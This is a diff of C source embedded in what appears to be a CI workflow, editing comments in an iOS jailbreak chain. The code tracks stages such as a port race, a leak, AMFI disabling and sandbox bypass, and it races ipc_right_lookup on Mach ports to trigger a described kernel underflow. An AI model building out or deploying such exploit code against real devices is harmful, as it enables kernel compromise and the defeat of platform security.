@@ -184,8 +184,8 @@ jobs:
               pid_t       helper_pid;
               int         amfi_disabled;
               int         sandbox_bypassed;
-              int         last_stage;   /* 0=start 1=helper 2=race 3=confirm 4=leak 5=amfi 6=sandbox */
-              int         last_kr;      /* last kern_return_t */
+              int         last_stage;
+              int         last_kr;
           } jb_state_t;
 
           int  jb_run_chain(jb_state_t *st);
@@ -229,17 +229,17 @@ jobs:
 
           static volatile int g_race_done = 0;
 
-          /* fork() from a sandboxed app is denied on iOS; race against our
-             own task instead. task_name_for_pid on our own PID returns a
-             name port backed by our own ipc_space, which is the object the
-             beta-4 underflow path operates on. */
+          /* fork() from a sandboxed app is denied on iOS; race against
+             our own task instead. task_name_for_pid on our own PID
+             returns a name port backed by our own ipc_space, which is
+             exactly the object the beta-4 underflow applies to. */
           static pid_t spawn_helper(void) {
               return getpid();
           }
 
-          /* Widen the *port namespace* window. The lookup we race is
-             ipc_right_lookup on a name in MACH_PORT_DEAD state, so churn
-             port slot allocation in the same IPC space. */
+          /* Widen the *port namespace* window: churn receive rights in
+             the same IPC space so ipc_right_lookup keeps seeing a name
+             in MACH_PORT_DEAD state. */
           static void *race_port_thread(void *arg) {
               mach_port_t task = mach_task_self();
               while (!g_race_done) {
